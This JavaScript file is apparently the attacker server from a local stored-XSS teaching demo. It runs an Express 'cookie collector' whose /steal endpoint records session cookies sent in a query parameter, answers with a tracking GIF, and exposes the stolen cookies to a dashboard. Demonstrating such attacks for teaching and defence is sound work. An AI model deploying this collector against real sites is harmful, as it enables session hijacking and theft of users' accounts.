/*
 * How to Run:
 *
 * Terminal 1: cd demo-attacked/xss/stored && npm install && npm run victim
 * Terminal 2: cd demo-attacked/xss/stored && npm run attacker
 *
 * Then open:
 *   http://localhost:3001/admin  ← Open first to set the agent cookie
 *   http://localhost:3002        ← Attacker dashboard (open in a separate window)
 *   http://localhost:3001        ← Customer portal (paste the payload here as a new ticket)
 */

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3002;

app.use(cors());
app.use(express.static(path.join(__dirname)));

const stolenCookies = [];

// 1x1 transparent GIF
const TRANSPARENT_GIF = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

app.get('/steal', (req, res) => {
  const cookie = req.query.c || '';

  if (cookie) {
    const entry = {
      cookie,
      timestamp: new Date().toISOString(),
    };
    stolenCookies.unshift(entry);
    console.log(`[STOLEN] Cookie received: ${cookie}`);
  }

  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Cache-Control', 'no-store');
  res.send(TRANSPARENT_GIF);
});

app.get('/api/stolen', (req, res) => {
  res.json(stolenCookies);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'attacker.html'));
});

app.listen(PORT, () => {
  console.log(`Cookie collector (attacker) running at http://localhost:${PORT}`);
});
